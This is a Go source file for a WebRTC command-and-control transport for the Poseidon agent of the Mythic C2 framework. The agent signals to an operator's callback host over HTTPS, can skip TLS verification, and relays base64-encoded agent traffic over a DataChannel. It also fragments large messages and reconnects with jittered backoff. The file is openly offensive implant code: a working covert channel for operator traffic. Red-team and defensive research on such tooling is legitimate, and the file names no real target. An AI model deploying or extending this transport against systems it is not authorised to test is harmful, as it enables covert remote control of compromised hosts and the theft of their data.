//go:build webrtc
// +build webrtc

// Mythic WebRTC transport for Poseidon.
//
// Copy this file into:
//
//	Payload_Type/poseidon/agent_code/pkg/profiles/webrtc_transport.go
//
// Companion wrapper implementing the Poseidon Profile interface is in
// webrtc.go.
//
// Wire format on the DataChannel (both directions):
//
//	{"uuid": "<36-char agent uuid>", "message": "<base64 mythic blob>"}
//
// Lifecycle:
//
//  1. First SendToC2 triggers dial(): builds an RTCPeerConnection, creates
//     an ordered DataChannel, gathers ICE candidates to completion, POSTs
//     the SDP offer to <callback_host>:<port>/signaling/negotiate, applies
//     the answer.
//  2. While the channel is open, SendToC2 writes the envelope directly.
//     Replies are delivered to Recv() via an inbound queue.
//  3. On terminal PeerConnectionState (Failed/Closed) or ICEConnectionState
//     Failed, the supervisor tears down and re-signals using exponential
//     back-off capped at ReconnectMax, with ReconnectJitter applied.
//     `Disconnected` is treated as transient and does NOT trigger teardown
//     immediately (WebRTC can recover without re-signaling).
package profiles

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/pion/webrtc/v3"
)

// ErrClosed is returned once Close has been called.
var ErrClosed = errors.New("webrtc transport closed")

type Config struct {
	AgentUUID        string
	CallbackHost     string // e.g. "https://c2.example.com"
	CallbackPort     int    // 0 = leave off; otherwise appended as :port
	SignalingURI     string // default "signaling/negotiate"
	DataChannelLabel string // default "mythic-data"
	UserAgent        string
	STUNServers      []string // default []string{"stun:stun.l.google.com:19302"}
	TURNServer       string
	TURNUsername     string
	TURNCredential   string
	ReconnectBase    time.Duration // default 5s
	ReconnectMax     time.Duration // default 5 min (exponential cap)
	ReconnectJitter  int           // 0..100 percent
	InsecureTLS      bool
	HTTPTimeout      time.Duration // default 30s for signaling POST
	ICEGatherTimeout time.Duration // default 15s
	InboundQueueSize int           // default 256; sends block when full
	InboundSendWait  time.Duration // default 5s, max time to wait when enqueueing an inbound msg
}

type envelope struct {
	UUID    string `json:"uuid"`
	Message string `json:"message"`
}

// fragmentEnvelope is used when a single message exceeds the DataChannel's
// SCTP max message size (65536). The base64 payload is split across
// multiple fragments sharing the same Frag ID. The receiver reassembles
// in-order (DataChannel is ordered) and processes the result as a normal
// envelope.
type fragmentEnvelope struct {
	UUID  string `json:"uuid"`
	Frag  string `json:"frag"`  // group ID — same across all parts
	Seq   int    `json:"seq"`   // 0-based
	Count int    `json:"count"` // total number of fragments
	Data  string `json:"data"`  // chunk of the base64 message
}

// maxDCPayload is the maximum bytes per DataChannel message. SCTP's hard
// limit in pion is 65536; we stay well under to leave room for the JSON
// wrapper and avoid edge cases.
const maxDCPayload = 48000

// fragAssembly tracks in-progress fragment reassembly.
type fragAssembly struct {
	count   int
	parts   []string
	have    int
	created time.Time
}

type Transport struct {
	cfg Config

	mu      sync.Mutex
	pc      *webrtc.PeerConnection
	dc      *webrtc.DataChannel
	dialing bool
	// Monotonic attempt counter for exponential backoff. Reset on success.
	attempt int

	inbound   chan []byte
	closed    chan struct{}
	closeOnce atomic.Bool
	signalCh  chan struct{}

	// Fragment reassembly for inbound messages (server → agent).
	fragMu   sync.Mutex
	fragBufs map[string]*fragAssembly
}

// New constructs a Transport and spawns its supervisor.
func New(cfg Config) (*Transport, error) {
	if cfg.AgentUUID == "" {
		return nil, errors.New("webrtc: AgentUUID is required")
	}
	if cfg.CallbackHost == "" {
		return nil, errors.New("webrtc: CallbackHost is required")
	}
	if cfg.DataChannelLabel == "" {
		cfg.DataChannelLabel = "mythic-data"
	}
	if cfg.SignalingURI == "" {
		cfg.SignalingURI = "signaling/negotiate"
	}
	if len(cfg.STUNServers) == 0 {
		cfg.STUNServers = []string{"stun:stun.l.google.com:19302"}
	}
	if cfg.ReconnectBase <= 0 {
		cfg.ReconnectBase = 5 * time.Second
	}
	if cfg.ReconnectMax <= 0 {
		cfg.ReconnectMax = 5 * time.Minute
	}
	if cfg.HTTPTimeout <= 0 {
		cfg.HTTPTimeout = 30 * time.Second
	}
	if cfg.ICEGatherTimeout <= 0 {
		cfg.ICEGatherTimeout = 15 * time.Second
	}
	if cfg.InboundQueueSize <= 0 {
		cfg.InboundQueueSize = 256
	}
	if cfg.InboundSendWait <= 0 {
		cfg.InboundSendWait = 5 * time.Second
	}
	t := &Transport{
		cfg:      cfg,
		inbound:  make(chan []byte, cfg.InboundQueueSize),
		closed:   make(chan struct{}),
		signalCh: make(chan struct{}, 1),
		fragBufs: make(map[string]*fragAssembly),
	}
	go t.supervisor()
	return t, nil
}

// SendToC2 writes a Mythic agent message to the DataChannel, dialing or
// waiting up to 30s for the channel to come up if it is not currently open.
func (t *Transport) SendToC2(data []byte) error {
	return t.SendToC2Ctx(context.Background(), data, 30*time.Second)
}

func (t *Transport) SendToC2Ctx(ctx context.Context, data []byte, wait time.Duration) error {
	if t.isClosed() {
		return ErrClosed
	}
	dc := t.openChannel()
	if dc == nil {
		// Never kick signaling from the send path. The supervisor goroutine
		// owns the connection lifecycle: it dials on startup and re-dials
		// when OnConnectionStateChange reports Failed/Closed. Kicking from
		// here races with an in-progress dial() or ICE negotiation and
		// kills connections that are still establishing.
		var err error
		dc, err = t.waitOpen(ctx, wait)
		if err != nil {
			return err
		}
	}
	msg := base64.StdEncoding.EncodeToString(data)

	// Try as a single envelope first.
	out, err := json.Marshal(envelope{UUID: t.cfg.AgentUUID, Message: msg})
	if err != nil {
		return err
	}
	if len(out) <= maxDCPayload {
		if err := dc.SendText(string(out)); err != nil {
			t.kickSignaling()
			return fmt.Errorf("webrtc: send: %w", err)
		}
		return nil
	}

	// Message too large for a single DataChannel message — fragment it.
	return t.sendFragmented(dc, msg)
}

// sendFragmented splits a base64 message across multiple DataChannel
// messages using the fragmentEnvelope wire format. The server reassembles
// fragments sharing the same Frag ID before relaying to Mythic.
func (t *Transport) sendFragmented(dc *webrtc.DataChannel, msg string) error {
	// Reserve space for the JSON wrapper around each fragment.
	// {"uuid":"<36>","frag":"<8>","seq":999,"count":999,"data":""}
	// ≈ 120 bytes overhead. Use 200 for safety.
	chunkSize := maxDCPayload - 200
	if chunkSize <= 0 {
		return errors.New("webrtc: maxDCPayload too small for fragmentation")
	}
	totalChunks := (len(msg) + chunkSize - 1) / chunkSize
	fragID := t.genFragID()

	for i := 0; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(msg) {
			end = len(msg)
		}
		out, err := json.Marshal(fragmentEnvelope{
			UUID:  t.cfg.AgentUUID,
			Frag:  fragID,
			Seq:   i,
			Count: totalChunks,
			Data:  msg[start:end],
		})
		if err != nil {
			return err
		}
		if err := dc.SendText(string(out)); err != nil {
			t.kickSignaling()
			return fmt.Errorf("webrtc: send frag %d/%d: %w", i+1, totalChunks, err)
		}
	}
	return nil
}

func (t *Transport) genFragID() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

// Recv blocks for the next message from the C2. Returns io.EOF after Close.
func (t *Transport) Recv(ctx context.Context) ([]byte, error) {
	select {
	case msg, ok := <-t.inbound:
		if !ok {
			return nil, io.EOF
		}
		return msg, nil
	case <-t.closed:
		return nil, io.EOF
	case <-ctx.Done():
		return nil, ctx.Err()
	}
}

// Close tears the transport down and wakes any blocked Recv/SendToC2.
func (t *Transport) Close() error {
	if !t.closeOnce.CompareAndSwap(false, true) {
		return nil
	}
	close(t.closed)
	t.mu.Lock()
	pc := t.pc
	t.pc, t.dc = nil, nil
	t.mu.Unlock()
	if pc != nil {
		_ = pc.Close()
	}
	return nil
}

func (t *Transport) isClosed() bool { return t.closeOnce.Load() }

// -- internals --------------------------------------------------------------

func (t *Transport) openChannel() *webrtc.DataChannel {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.dc != nil && t.dc.ReadyState() == webrtc.DataChannelStateOpen {
		return t.dc
	}
	return nil
}

// hasLivePC reports whether a PeerConnection exists and is not in a terminal
// state. Used to avoid re-signaling while ICE is still connecting.
func (t *Transport) hasLivePC() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.pc == nil {
		return false
	}
	state := t.pc.ConnectionState()
	return state != webrtc.PeerConnectionStateFailed &&
		state != webrtc.PeerConnectionStateClosed
}

func (t *Transport) kickSignaling() {
	if t.isClosed() {
		return
	}
	select {
	case t.signalCh <- struct{}{}:
	default:
	}
}

func (t *Transport) waitOpen(ctx context.Context, d time.Duration) (*webrtc.DataChannel, error) {
	deadline := time.Now().Add(d)
	tick := time.NewTicker(100 * time.Millisecond)
	defer tick.Stop()
	for {
		if dc := t.openChannel(); dc != nil {
			return dc, nil
		}
		if time.Now().After(deadline) {
			return nil, errors.New("webrtc: timeout waiting for datachannel")
		}
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-t.closed:
			return nil, ErrClosed
		case <-tick.C:
		}
	}
}

func (t *Transport) supervisor() {
	t.kickSignaling() // initial dial
	for {
		select {
		case <-t.closed:
			return
		case <-t.signalCh:
		}
		if err := t.dial(); err != nil {
			t.onDialFailure()
		} else {
			t.mu.Lock()
			t.attempt = 0
			t.mu.Unlock()
		}
	}
}

func (t *Transport) onDialFailure() {
	t.mu.Lock()
	t.attempt++
	attempt := t.attempt
	t.mu.Unlock()

	// Exponential: base * 2^(attempt-1), capped.
	backoff := t.cfg.ReconnectBase
	for i := 1; i < attempt && backoff < t.cfg.ReconnectMax; i++ {
		backoff *= 2
	}
	if backoff > t.cfg.ReconnectMax {
		backoff = t.cfg.ReconnectMax
	}
	if t.cfg.ReconnectJitter > 0 {
		backoff += time.Duration(rand.Int63n(int64(backoff) * int64(t.cfg.ReconnectJitter) / 100))
	}
	select {
	case <-time.After(backoff):
	case <-t.closed:
		return
	}
	t.kickSignaling()
}

func (t *Transport) dial() error {
	if t.isClosed() {
		return ErrClosed
	}
	t.mu.Lock()
	if t.dialing {
		t.mu.Unlock()
		return nil
	}
	t.dialing = true
	if t.pc != nil {
		_ = t.pc.Close()
		t.pc, t.dc = nil, nil
	}
	t.mu.Unlock()
	defer func() {
		t.mu.Lock()
		t.dialing = false
		t.mu.Unlock()
	}()

	iceServers := []webrtc.ICEServer{}
	for _, s := range t.cfg.STUNServers {
		if s != "" {
			iceServers = append(iceServers, webrtc.ICEServer{URLs: []string{s}})
		}
	}
	if t.cfg.TURNServer != "" {
		iceServers = append(iceServers, webrtc.ICEServer{
			URLs: []string{t.cfg.TURNServer}, Username: t.cfg.TURNUsername, Credential: t.cfg.TURNCredential,
		})
	}

	pc, err := webrtc.NewPeerConnection(webrtc.Configuration{ICEServers: iceServers})
	if err != nil {
		return fmt.Errorf("new peer connection: %w", err)
	}

	ordered := true
	dc, err := pc.CreateDataChannel(t.cfg.DataChannelLabel, &webrtc.DataChannelInit{Ordered: &ordered})
	if err != nil {
		_ = pc.Close()
		return fmt.Errorf("create data channel: %w", err)
	}

	dc.OnMessage(func(msg webrtc.DataChannelMessage) {
		t.deliverInbound(msg.Data)
	})
	dc.OnError(func(err error) {
		// A channel-level error (e.g., SCTP abort) is effectively a
		// connection failure; trigger reconnect.
		t.kickSignaling()
	})

	pc.OnConnectionStateChange(func(s webrtc.PeerConnectionState) {
		switch s {
		case webrtc.PeerConnectionStateFailed,
			webrtc.PeerConnectionStateClosed:
			t.kickSignaling()
		}
	})
	pc.OnICEConnectionStateChange(func(s webrtc.ICEConnectionState) {
		if s == webrtc.ICEConnectionStateFailed {
			t.kickSignaling()
		}
	})

	offer, err := pc.CreateOffer(nil)
	if err != nil {
		_ = pc.Close()
		return fmt.Errorf("create offer: %w", err)
	}
	gather := webrtc.GatheringCompletePromise(pc)
	if err := pc.SetLocalDescription(offer); err != nil {
		_ = pc.Close()
		return fmt.Errorf("set local description: %w", err)
	}
	select {
	case <-gather:
	case <-time.After(t.cfg.ICEGatherTimeout):
		_ = pc.Close()
		return errors.New("ice gathering timed out")
	case <-t.closed:
		_ = pc.Close()
		return ErrClosed
	}

	answer, err := t.postOffer(*pc.LocalDescription())
	if err != nil {
		_ = pc.Close()
		return fmt.Errorf("signaling: %w", err)
	}
	if err := pc.SetRemoteDescription(answer); err != nil {
		_ = pc.Close()
		return fmt.Errorf("set remote description: %w", err)
	}

	// If Close was called mid-dial, discard this PC rather than store it.
	if t.isClosed() {
		_ = pc.Close()
		return ErrClosed
	}
	t.mu.Lock()
	t.pc, t.dc = pc, dc
	t.mu.Unlock()
	return nil
}

func (t *Transport) deliverInbound(raw []byte) {
	// Peek at the JSON to decide: normal envelope or fragment?
	var probe struct {
		Frag string `json:"frag"`
	}
	if err := json.Unmarshal(raw, &probe); err != nil {
		return
	}

	var b64msg string
	if probe.Frag != "" {
		// Fragment — reassemble.
		var frag fragmentEnvelope
		if err := json.Unmarshal(raw, &frag); err != nil {
			return
		}
		assembled := t.addInboundFragment(frag)
		if assembled == nil {
			return // waiting for more parts
		}
		b64msg = *assembled
	} else {
		// Normal single-message envelope.
		var env envelope
		if err := json.Unmarshal(raw, &env); err != nil {
			return
		}
		b64msg = env.Message
	}

	payload, err := base64.StdEncoding.DecodeString(b64msg)
	if err != nil {
		return
	}
	// Back-pressure: block up to InboundSendWait to enqueue. Do NOT drop
	// silently — Poseidon's synchronous SendMessage/Recv pattern relies on
	// every reply being delivered. Dropping here would corrupt
	// request/response correlation.
	timer := time.NewTimer(t.cfg.InboundSendWait)
	defer timer.Stop()
	select {
	case t.inbound <- payload:
	case <-timer.C:
		// Queue remained full for InboundSendWait — application isn't
		// keeping up. Signal a reconnect so state resets.
		t.kickSignaling()
	case <-t.closed:
	}
}

// addInboundFragment buffers a fragment and returns the reassembled base64
// message when all parts have arrived. Returns nil while incomplete.
func (t *Transport) addInboundFragment(f fragmentEnvelope) *string {
	t.fragMu.Lock()
	defer t.fragMu.Unlock()

	buf, ok := t.fragBufs[f.Frag]
	if !ok {
		buf = &fragAssembly{
			count:   f.Count,
			parts:   make([]string, f.Count),
			created: time.Now(),
		}
		t.fragBufs[f.Frag] = buf
	}
	if f.Seq < 0 || f.Seq >= buf.count {
		return nil
	}
	if buf.parts[f.Seq] == "" {
		buf.parts[f.Seq] = f.Data
		buf.have++
	}
	if buf.have < buf.count {
		return nil
	}
	// All parts received — reassemble.
	var sb strings.Builder
	for _, part := range buf.parts {
		sb.WriteString(part)
	}
	delete(t.fragBufs, f.Frag)
	result := sb.String()
	return &result
}

func (t *Transport) signalingURL() string {
	host := t.cfg.CallbackHost
	if t.cfg.CallbackPort != 0 {
		host = fmt.Sprintf("%s:%d", host, t.cfg.CallbackPort)
	}
	uri := t.cfg.SignalingURI
	if !strings.HasPrefix(uri, "/") {
		uri = "/" + uri
	}
	return host + uri
}

func (t *Transport) postOffer(o webrtc.SessionDescription) (webrtc.SessionDescription, error) {
	body, _ := json.Marshal(map[string]string{
		"uuid": t.cfg.AgentUUID, "sdp": o.SDP, "type": o.Type.String(),
	})
	req, err := http.NewRequest(http.MethodPost, t.signalingURL(), bytes.NewReader(body))
	if err != nil {
		return webrtc.SessionDescription{}, err
	}
	req.Header.Set("Content-Type", "application/json")
	if t.cfg.UserAgent != "" {
		req.Header.Set("User-Agent", t.cfg.UserAgent)
	}
	client := &http.Client{
		Timeout:   t.cfg.HTTPTimeout,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: t.cfg.InsecureTLS}},
	}
	resp, err := client.Do(req)
	if err != nil {
		return webrtc.SessionDescription{}, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return webrtc.SessionDescription{}, fmt.Errorf("signaling http %d", resp.StatusCode)
	}
	// Cap signaling response — an answer SDP is a few KB, anything over
	// 256 KB is pathological.
	body2, err := io.ReadAll(io.LimitReader(resp.Body, 256<<10))
	if err != nil {
		return webrtc.SessionDescription{}, err
	}
	var parsed struct {
		SDP, Type string
	}
	if err := json.Unmarshal(body2, &parsed); err != nil {
		return webrtc.SessionDescription{}, err
	}
	if parsed.Type != "answer" {
		return webrtc.SessionDescription{}, fmt.Errorf("unexpected sdp type %q", parsed.Type)
	}
	if parsed.SDP == "" {
		return webrtc.SessionDescription{}, errors.New("empty answer sdp")
	}
	return webrtc.SessionDescription{Type: webrtc.SDPTypeAnswer, SDP: parsed.SDP}, nil
}
